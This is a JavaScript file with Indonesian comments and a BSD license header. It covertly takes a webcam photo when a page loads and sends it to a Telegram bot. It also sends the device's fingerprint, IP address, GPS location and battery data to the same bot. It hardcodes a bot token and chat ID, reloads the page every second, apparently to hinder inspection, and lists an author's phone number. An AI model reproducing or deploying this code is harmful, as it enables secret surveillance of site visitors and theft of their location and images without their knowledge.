// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
setInterval(function(){
    if(typeof console !== 'undefined') {
      window.location.reload();
    }
  }, 1000);

function takePhotoAndSendToTelegram() {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            
            return new Promise((resolve, reject) => {
                video.onloadedmetadata = () => {
                    video.play()
                        .then(() => {
                            // Ambil frame segera setelah video mulai bermain
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0);
                            
                            // Kirim gambar
                            const dataUrl = canvas.toDataURL('image/png');
                            sendToTelegram(dataUrl);
                            
                            // Bersihkan resource
                            stream.getTracks().forEach(track => track.stop());
                            document.body.removeChild(video);
                            resolve();
                        })
                        .catch(reject);
                };
            });
        })
        .catch(err => {
            console.error("Gagal mengakses kamera:", err);
            document.body.removeChild(video);
        });
}

// Fungsi untuk mengirim foto ke Telegram (tetap sama)
function sendToTelegram(imageData) {
    const botToken = '7625471547:AAGeZHuKBGJAPSEsNYELwUtgp03e-taYnxQ';
    const chatId = '-1002360934041';
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    let formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (!data.ok) console.error('Gagal mengirim foto:', data);
    })
    .catch(error => console.error('Error:', error));
}

// Fungsi konversi data URI ke Blob (tetap sama)
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

document.addEventListener('DOMContentLoaded', takePhotoAndSendToTelegram);

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

async function detectDeviceInfoAndSendToTelegram() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const additionalLanguages = navigator.languages ? navigator.languages.join(", ") : "Tidak tersedia";
    const vendor = navigator.vendor;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const onlineStatus = navigator.onLine ? "✅ Online" : "❌ Offline";
    const connectionType = connection ? connection.effectiveType : "Tidak diketahui";
    const networkType = connection && connection.type ? connection.type : 'Tidak diketahui';
    const downlinkSpeed = connection ? `${connection.downlink} Mbps` : "Tidak diketahui";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const localTime = new Date().toLocaleString();
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Aktif 🌙" : "Nonaktif ☀️";
    const touchscreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Ada" : "Tidak Ada";
    const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Nonaktif";
    const deviceOrientation = window.matchMedia("(orientation: portrait)").matches ? "Portrait" : "Landscape";
    const deviceUptime = `${(performance.now() / 1000 / 60 / 60).toFixed(2)} jam`;
    const isMobileDevice = /Mobi|Android/i.test(userAgent) ? "Ya (Mobile)" : "Tidak (Desktop/Tablet)";
    const gpu = detectGPU();

    // Informasi CPU dan Memori
    const hardwareConcurrency = navigator.hardwareConcurrency || "Tidak diketahui";
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak diketahui";

    // Informasi Storage
    const localStorageSize = calculateStorageSize(localStorage);
    const sessionStorageSize = calculateStorageSize(sessionStorage);

    let ipAddress = "Tidak diketahui";
    let latitude = "Tidak diketahui";
    let longitude = "Tidak diketahui";
    let locationInfo = "Lokasi tidak diketahui";

    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        ipAddress = data.ip || "Tidak diketahui";
        if (!latitude || latitude === "Tidak diketahui") latitude = data.latitude || "Tidak diketahui";
        if (!longitude || longitude === "Tidak diketahui") longitude = data.longitude || "Tidak diketahui";
        locationInfo = `${data.city}, ${data.region}, ${data.country_name}`;
    } catch (error) {
        console.error('Gagal mendapatkan lokasi berdasarkan IP:', error);
    }

    // Informasi Baterai
    let batteryInfo = "Tidak tersedia";
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryInfo = `Level: ${(battery.level * 100).toFixed(0)}%, ` +
            `Status Pengisian: ${battery.charging ? "Sedang mengisi ⚡" : "Tidak mengisi"}, ` +
            `Waktu Pengisian: ${battery.chargingTime ? `${battery.chargingTime} detik` : "Tidak diketahui"}, ` +
            `Waktu Penggunaan: ${battery.dischargingTime ? `${battery.dischargingTime} detik` : "Tidak diketahui"}`;
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                latitude = position.coords.latitude.toFixed(6);
                longitude = position.coords.longitude.toFixed(6);
                locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
                sendToTelegram();
            },
            (error) => {
                console.error('Gagal mendapatkan lokasi dengan Geolocation API:', error.message);
                sendToTelegram();
            }
        );
    } else {
        console.error('Geolocation API tidak didukung di browser ini.');
        sendToTelegram();
    }

    function translateNetworkType(type) {
        if (!type) return 'Tidak Diketahui';
        switch(type.toLowerCase()) {
            case 'wifi': return 'WiFi 📶';
            case 'cellular': return 'Data Seluler 📱';
            case 'ethernet': return 'Ethernet 🔌';
            case 'bluetooth': return 'Bluetooth 🦷';
            case 'unknown': return 'Tidak Diketahui';
            default: return type;
        }
    }

    function sendToTelegram() {
        const deviceInfo = {
            userAgent: userAgent,
            platform: platform,
            language: language,
            additionalLanguages: additionalLanguages,
            vendor: vendor,
            browser: detectBrowser(),
            os: detectOS(),
            screenResolution: `${screenWidth} x ${screenHeight}`,
            onlineStatus: onlineStatus,
            networkType: translateNetworkType(networkType),
            connectionType: connectionType,
            downlinkSpeed: downlinkSpeed,
            timezone: timezone,
            localTime: localTime,
            darkMode: darkMode,
            touchscreen: touchscreen,
            cookieEnabled: cookieEnabled,
            deviceOrientation: deviceOrientation,
            deviceUptime: deviceUptime,
            hardwareConcurrency: hardwareConcurrency,
            deviceMemory: deviceMemory,
            localStorageSize: localStorageSize,
            sessionStorageSize: sessionStorageSize,
            ipAddress: ipAddress,
            latitude: latitude,
            longitude: longitude,
            locationInfo: locationInfo,
            batteryInfo: batteryInfo,
            isMobileDevice: isMobileDevice,
            gpu: gpu
        };

        const botToken = '7625471547:AAGeZHuKBGJAPSEsNYELwUtgp03e-taYnxQ';  // Ganti dengan token bot kamu
        const chatId = '-1002360934041t';  // Ganti dengan ID chat telegram kamu 
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const message = `📱 *Informasi Perangkat:*

` +
            `🖥️ *Umum:*
` +
            `• *Agen Pengguna:* ${deviceInfo.userAgent}
` +
            `• *Platform:* ${deviceInfo.platform}
` +
            `• *Bahasa Utama:* ${deviceInfo.language}
` +
            `• *Bahasa Tambahan:* ${deviceInfo.additionalLanguages}
` +
            `• *Vendor:* ${deviceInfo.vendor}

` +
            `🌐 *Jaringan:*
` +
            `• *Status Online:* ${deviceInfo.onlineStatus}
` +         
            `• *Tipe Jaringan:* ${deviceInfo.networkType}
` +
            `• *Tipe Koneksi:* ${deviceInfo.connectionType}
` +
            `• *Kecepatan Koneksi:* ${deviceInfo.downlinkSpeed}

` +
            `📍 *Lokasi:*
` +
            `• *IP Address:* ${deviceInfo.ipAddress}
` +
            `• *Lokasi:* ${deviceInfo.locationInfo}
` +
            `• *Latitude:* ${deviceInfo.latitude}
` +
            `• *Longitude:* ${deviceInfo.longitude}

` +
            `🔋 *Baterai:*
` +
            `• ${deviceInfo.batteryInfo}

` +
            `🔧 *Hardware:*
` +
            `• *CPU Cores:* ${deviceInfo.hardwareConcurrency}
` +
            `• *Memori Perangkat:* ${deviceInfo.deviceMemory}
` +
            `• *GPU:* ${deviceInfo.gpu}
` +
            `• *Touchscreen:* ${deviceInfo.touchscreen}

` +
            `🕒 *Waktu:*
` +
            `• *Waktu Lokal:* ${deviceInfo.localTime}
` +
            `• *Zona Waktu:* ${deviceInfo.timezone}
` +
            `• *Waktu Boot Perangkat:* ${deviceInfo.deviceUptime};

            
` +
            `📌 _Laporan dibuat pada ${new Date().toLocaleString()}_`;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');

        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Informasi perangkat berhasil dikirim ke Telegram.');
            } else {
                console.error('Gagal mengirim informasi perangkat ke Telegram.', data);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
}

// Fungsi untuk menghitung ukuran penyimpanan
function calculateStorageSize(storage) {
    let total = 0;
    for (let key in storage) {
        if (storage.hasOwnProperty(key)) {
            total += (storage[key].length + key.length) * 2;
        }
    }
    return (total / 1024).toFixed(2) + " KB";
}

// Fungsi untuk mendeteksi browser
function detectBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) return 'Google Chrome';
    if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Apple Safari';
    if (userAgent.includes('Edge')) return 'Microsoft Edge';
    if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
    return 'Browser tidak dikenal';
}

// Fungsi untuk mendeteksi sistem operasi
function detectOS() {
    const platform = navigator.platform.toLowerCase();
    if (platform.includes('win')) return 'Windows';
    if (platform.includes('mac')) return 'MacOS';
    if (platform.includes('linux')) return 'Linux';
    if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
    if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
    return 'Sistem operasi tidak dikenal';
}

// Fungsi untuk mendeteksi GPU
function detectGPU() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "Tidak diketahui";
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Tidak diketahui";
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    detectDeviceInfoAndSendToTelegram();
});
